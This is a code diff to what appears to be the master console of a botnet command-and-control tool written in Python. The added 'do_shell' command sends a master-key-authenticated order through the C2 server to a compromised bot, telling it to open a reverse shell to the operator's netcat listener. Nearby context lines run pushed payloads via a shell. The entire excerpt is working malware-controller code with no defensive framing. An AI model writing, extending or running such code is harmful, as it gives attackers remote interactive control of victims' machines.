@@ -232,6 +232,25 @@ ___  ___          _              _____                       _
                 #print("[*] payload = ", payload)
                 process = Popen(payload, shell=True)
 
+    """
+    Command: Shell 
+    Description: Spawn an interactive shell between the target machine and the master. 
+    """
+    shell_parser = argparse.ArgumentParser()
+    shell_parser.add_argument('-t', '--target', type=str, help="Target bot's IP address")
+    shell_parser.add_argument('-p', '--port', type=str, help="Reverse shell port")
+    @cmd2.with_category(CUSTOM_CATEGORY)
+    @cmd2.with_argparser(shell_parser)
+    def do_shell(self, args):
+        url = URL + '/bot/' + args.target + '/push'
+        masterkey = MASTERKEY 
+        cmd = "shell " + args.port 
+
+        data = {'masterkey': masterkey, 'cmd': cmd}
+        res = requests.post(url, data=data)
+
+        output_push = ansi.style("[+] Reverse shell staged. Openup netcat!: " + args.target, fg='green', bold=True)
+         
 
     """
     Command: Download
